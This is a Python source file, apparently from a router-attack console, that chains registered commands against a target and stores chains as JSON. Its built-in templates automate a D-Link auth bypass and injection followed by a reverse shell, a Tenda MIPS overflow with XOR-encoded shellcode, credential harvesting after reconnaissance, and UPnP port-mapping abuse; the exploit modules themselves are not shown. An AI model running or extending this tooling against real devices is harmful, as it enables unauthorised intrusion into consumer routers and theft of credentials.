import sys
import os
import json
import time
import argparse
from datetime import datetime, timezone

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from RegistroComandos import RegistroComandos
except ImportError:
    RegistroComandos = None

try:
    from Sessao import Sessao
except ImportError:
    Sessao = None


class Cadeia:

    CONDICIONAIS = ("sempre", "se_ok", "se_falha")

    @staticmethod
    def Timestamp():
        return datetime.now(timezone.utc).isoformat()

    @staticmethod
    def _ValidarBloco(Bloco, Indice):
        Erros = []
        Avisos = []
        if not isinstance(Bloco, dict):
            Erros.append(f"bloco[{Indice}] nao e dict")
            return Erros, Avisos
        Cmd = Bloco.get("cmd")
        if not Cmd:
            Erros.append(f"bloco[{Indice}] sem campo 'cmd'")
        elif RegistroComandos is not None:
            Info = RegistroComandos.COMANDOS.get(Cmd)
            if not Info:
                Erros.append(f"bloco[{Indice}] cmd desconhecido: {Cmd}")
            else:
                Obrig = [K for K, V in Info["argumentos"].items() if "obrigatorio" in V]
                Args = Bloco.get("args") or {}
                for K in Obrig:
                    if K not in Args and not (K == "alvo" and "Alvo" in Args):
                        Avisos.append(f"bloco[{Indice}] falta argumento obrigatorio: {K}")
        Cond = Bloco.get("condicional", "sempre")
        if Cond not in Cadeia.CONDICIONAIS:
            Erros.append(f"bloco[{Indice}] condicional invalido: {Cond}")
        return Erros, Avisos

    @staticmethod
    def Validar(Blocos):
        if not isinstance(Blocos, list):
            return {"ok": False, "motivo": "blocos_precisa_ser_lista",
                    "erros": ["blocos nao e lista"], "avisos": [], "total_blocos": 0}
        if not Blocos:
            return {"ok": False, "motivo": "lista_vazia",
                    "erros": ["nenhum bloco"], "avisos": [], "total_blocos": 0}
        TodosErros = []
        TodosAvisos = []
        for I, B in enumerate(Blocos):
            E, A = Cadeia._ValidarBloco(B, I)
            TodosErros.extend(E)
            TodosAvisos.extend(A)
        return {"ok": len(TodosErros) == 0, "erros": TodosErros, "avisos": TodosAvisos,
                "total_blocos": len(Blocos)}

    @staticmethod
    def _DeveExecutar(Condicional, OkAnterior):
        if Condicional == "sempre":
            return True
        if Condicional == "se_ok":
            return OkAnterior is True
        if Condicional == "se_falha":
            return OkAnterior is False
        return True

    @staticmethod
    def _EnriquecerArgs(Args, Alvo, Contexto):
        Args = dict(Args or {})
        if "alvo" not in Args and "Alvo" not in Args and Alvo:
            Args["alvo"] = Alvo
        if Contexto:
            for K, V in Contexto.items():
                if K not in Args:
                    Args[K] = V
        return Args

    @staticmethod
    def _AtualizarContexto(Contexto, Bloco, Resultado):
        if Contexto is None:
            Contexto = {}
        Contexto["_ultimo_cmd"] = Bloco.get("cmd")
        Contexto["_ultimo_ok"] = bool(Resultado.get("ok"))
        Contexto["_ultimo_resultado"] = Resultado.get("resultado")
        return Contexto

    @staticmethod
    def Executar(Blocos, Alvo=None, PausaCallback=None, PararNoErro=True, Contexto=None):
        if RegistroComandos is None:
            return {"ok": False, "motivo": "RegistroComandos_indisponivel"}
        Val = Cadeia.Validar(Blocos)
        if not Val["ok"]:
            return {"ok": False, "motivo": "validacao_falhou", "erros": Val["erros"],
                    "avisos": Val["avisos"]}
        Contexto = dict(Contexto or {})
        BlocosResultado = []
        OkAnterior = None
        InicioTotal = time.monotonic()
        Estado = "completo"
        for I, Bloco in enumerate(Blocos):
            Cmd = Bloco.get("cmd")
            Cond = Bloco.get("condicional", "sempre")
            Desc = Bloco.get("descricao", "")
            Executou = Cadeia._DeveExecutar(Cond, OkAnterior)
            if not Executou:
                BlocosResultado.append({"indice": I, "cmd": Cmd, "descricao": Desc,
                                        "estado": "pulado", "condicional": Cond,
                                        "resultado": None})
                continue
            Args = Cadeia._EnriquecerArgs(Bloco.get("args"), Alvo, Contexto)
            R = RegistroComandos.Executar(Cmd, Args)
            OkBloco = R.get("ok")
            BlocosResultado.append({"indice": I, "cmd": Cmd, "descricao": Desc,
                                    "estado": "ok" if OkBloco else "falhou",
                                    "condicional": Cond, "args_usados": Args,
                                    "tempo_ms": R.get("tempo_ms"),
                                    "resultado": R.get("resultado"),
                                    "erro": R.get("erro"), "motivo": R.get("motivo")})
            Contexto = Cadeia._AtualizarContexto(Contexto, Bloco, R)
            OkAnterior = OkBloco
            if PausaCallback is not None:
                try:
                    Continuar = PausaCallback(I, Bloco, BlocosResultado[-1])
                except Exception as E:
                    Continuar = True
                if Continuar is False:
                    Estado = "abortado"
                    break
            if OkBloco is False and PararNoErro:
                Estado = "falhou"
                break
        TempoTotal = round((time.monotonic() - InicioTotal) * 1000.0, 2)
        AlgumOk = any(B["estado"] == "ok" for B in BlocosResultado)
        return {"ok": algum_ok_se_necessario(BlocosResultado, Estado),
                "alvo": Alvo, "blocos_resultado": BlocosResultado,
                "tempo_total_ms": TempoTotal, "estado": Estado,
                "total_blocos": len(Blocos), "executados": len(BlocosResultado),
                "timestamp": Cadeia.Timestamp(), "contexto_final": Contexto}

    @staticmethod
    def _BaseDir():
        return os.path.join(os.path.expanduser("~"), ".console", "chains")

    @staticmethod
    def _GarantirBase():
        try:
            os.makedirs(Cadeia._BaseDir(), mode=0o700, exist_ok=True)
            return True
        except Exception:
            return False

    @staticmethod
    def Salvar(Nome, Blocos):
        if not Cadeia._GarantirBase():
            return {"ok": False, "motivo": "base_indisponivel"}
        if not Nome or "/" in Nome or "\\" in Nome or ".." in Nome:
            return {"ok": False, "motivo": f"nome_invalido:{Nome}"}
        Caminho = os.path.join(Cadeia._BaseDir(), Nome + ".json")
        Payload = {"nome": Nome, "timestamp": Cadeia.Timestamp(),
                   "blocos": Blocos, "total_blocos": len(Blocos)}
        try:
            with open(Caminho, "w", encoding="utf-8") as F:
                json.dump(Payload, F, ensure_ascii=False, indent=2)
            return {"ok": True, "caminho": Caminho, "tamanho_bytes": os.path.getsize(Caminho)}
        except Exception as E:
            return {"ok": False, "motivo": f"gravacao_falhou:{type(E).__name__}", "erro": str(E)}

    @staticmethod
    def Carregar(Nome):
        if not Nome or "/" in Nome or ".." in Nome:
            return {"ok": False, "motivo": f"nome_invalido:{Nome}"}
        Caminho = os.path.join(Cadeia._BaseDir(), Nome + ".json")
        if not os.path.isfile(Caminho):
            return {"ok": False, "motivo": "cadeia_nao_encontrada"}
        try:
            with open(Caminho, "r", encoding="utf-8") as F:
                P = json.load(F)
            return {"ok": True, "nome": P.get("nome", Nome), "timestamp": P.get("timestamp"),
                    "blocos": P.get("blocos", []), "total_blocos": len(P.get("blocos", []))}
        except Exception as E:
            return {"ok": False, "motivo": f"leitura_falhou:{type(E).__name__}", "erro": str(E)}

    @staticmethod
    def Listar():
        if not Cadeia._GarantirBase():
            return {"ok": False, "motivo": "base_indisponivel", "cadeias": []}
        Itens = []
        try:
            for Arq in sorted(os.listdir(Cadeia._BaseDir())):
                if not Arq.endswith(".json"):
                    continue
                Caminho = os.path.join(Cadeia._BaseDir(), Arq)
                try:
                    with open(Caminho, "r", encoding="utf-8") as F:
                        P = json.load(F)
                    Itens.append({"nome": P.get("nome", Arq[:-5]),
                                  "timestamp": P.get("timestamp"),
                                  "total_blocos": len(P.get("blocos", [])),
                                  "tamanho_bytes": os.path.getsize(Caminho)})
                except Exception:
                    pass
            return {"ok": True, "cadeias": Itens, "total": len(Itens)}
        except Exception as E:
            return {"ok": False, "motivo": f"listagem_falhou:{type(E).__name__}",
                    "erro": str(E), "cadeias": []}

    @staticmethod
    def Templates():
        return {"ok": True, "templates": [
            {"nome": "dlink_basico", "descricao": "exploit D-Link + reverse shell",
             "blocos": [{"cmd": "exploit dlink", "args": {"modo": "auto"}, "descricao": "auth bypass + injection"},
                        {"cmd": "shell reverse", "args": {"host": "127.0.0.1", "porta": 4444},
                         "condicional": "se_ok", "descricao": "reverse shell"}]},
            {"nome": "tenda_overflow", "descricao": "Tenda 29384 overflow MIPS",
             "blocos": [{"cmd": "exploit tenda29384", "args": {"cpu": "74kc", "encoder": "xor"},
                         "descricao": "shellcode + overflow"}]},
            {"nome": "recon_auto", "descricao": "analise + exploit automatico",
             "blocos": [{"cmd": "analise", "descricao": "scan consolidado"},
                        {"cmd": "cred", "args": {}, "condicional": "se_ok", "descricao": "credenciais"}]},
            {"nome": "scan_completo", "descricao": "scan + ssdp + httpauth + upnp",
             "blocos": [{"cmd": "scan", "descricao": "portas"},
                        {"cmd": "ssdp", "condicional": "se_ok", "descricao": "UPnP"},
                        {"cmd": "httpauth", "condicional": "se_ok", "descricao": "auth traversal"},
                        {"cmd": "upnp", "condicional": "se_ok", "descricao": "AddPortMapping"}]},
        ]}

    @staticmethod
    def ResultadoMarkdown(Resultado):
        if not isinstance(Resultado, dict):
            return {"ok": False, "motivo": "resultado_precisa_ser_dict"}
        Linhas = [f"# Cadeia — {Resultado.get('alvo') or 'sem alvo'}", ""]
        Linhas.append(f"- Estado: **{Resultado.get('estado')}**")
        Linhas.append(f"- Total: {Resultado.get('total_blocos')} blocos")
        Linhas.append(f"- Tempo: {Resultado.get('tempo_total_ms')} ms")
        Linhas.append("")
        Linhas.append("| # | comando | estado | tempo | motivo |")
        Linhas.append("|---|---|---|---|---|")
        for B in Resultado.get("blocos_resultado", []):
            Linhas.append(f"| {B.get('indice')} | {B.get('cmd')} | {B.get('estado')} | "
                          f"{B.get('tempo_ms') or '-'} | {B.get('motivo') or B.get('erro') or '-'} |")
        return {"ok": True, "md": "\n".join(Linhas)}

    @staticmethod
    def Main():
        P = argparse.ArgumentParser(prog="Cadeia")
        Sub = P.add_subparsers(dest="cmd")
        S = Sub.add_parser("show")
        S.add_argument("nome")
        L = Sub.add_parser("list")
        T = Sub.add_parser("templates")
        R = Sub.add_parser("run")
        R.add_argument("alvo")
        R.add_argument("--chain", required=True)
        R.add_argument("--parar-no-erro", action="store_true", default=True)
        R.add_argument("--json", action="store_true")
        Args = P.parse_args()

        if Args.cmd == "templates":
            Res = Cadeia.Templates()
            for T in Res["templates"]:
                print(f"  {T['nome']:20s} {T['descricao']}  ({len(T['blocos'])} blocos)")
            return 0
        elif Args.cmd == "list":
            Res = Cadeia.Listar()
            if not Res.get("ok"):
                print(f"[erro] {Res.get('motivo')}", file=sys.stderr)
                return 1
            for C in Res["cadeias"]:
                print(f"  {C['nome']:30s} {C['total_blocos']} blocos  {C['tamanho_bytes']}b")
            return 0
        elif Args.cmd == "show":
            Res = Cadeia.Carregar(Args.nome)
            if not Res.get("ok"):
                print(f"[erro] {Res.get('motivo')}", file=sys.stderr)
                return 1
            print(json.dumps(Res, indent=2, ensure_ascii=False))
            return 0
        elif Args.cmd == "run":
            if Args.chain.endswith(".json") and os.path.isfile(Args.chain):
                try:
                    with open(Args.chain, "r", encoding="utf-8") as F:
                        P = json.load(F)
                    Blocos = P.get("blocos", [])
                except Exception as E:
                    print(f"[erro] {E}", file=sys.stderr)
                    return 2
            else:
                Info = Cadeia.Templates()
                Achado = [T for T in Info["templates"] if T["nome"] == Args.chain]
                if not Achado:
                    Carregada = Cadeia.Carregar(Args.chain)
                    if not Carregada.get("ok"):
                        print(f"[erro] cadeia nao encontrada: {Args.chain}", file=sys.stderr)
                        return 2
                    Blocos = Carregada["blocos"]
                else:
                    Blocos = Achado[0]["blocos"]
            Res = Cadeia.Executar(Blocos, Args.alvo, PararNoErro=Args.parar_no_erro)
            if Args.json:
                print(json.dumps(Res, indent=2, ensure_ascii=False))
            else:
                print(f"estado: {Res.get('estado')}  tempo: {Res.get('tempo_total_ms')}ms")
                for B in Res.get("blocos_resultado", []):
                    print(f"  [{B['indice']}] {B['cmd']:20s} {B['estado']:8s} {B.get('tempo_ms') or '-'}ms")
            return 0 if Res.get("estado") == "completo" else 1
        else:
            P.print_help()
            return 2


def algum_ok_se_necessario(BlocosResultado, Estado):
    if Estado == "abortado":
        return any(B["estado"] == "ok" for B in BlocosResultado)
    if Estado == "falhou":
        return False
    return all(B["estado"] in ("ok", "pulado") for B in BlocosResultado)


if __name__ == "__main__":
    raise SystemExit(Cadeia.Main())
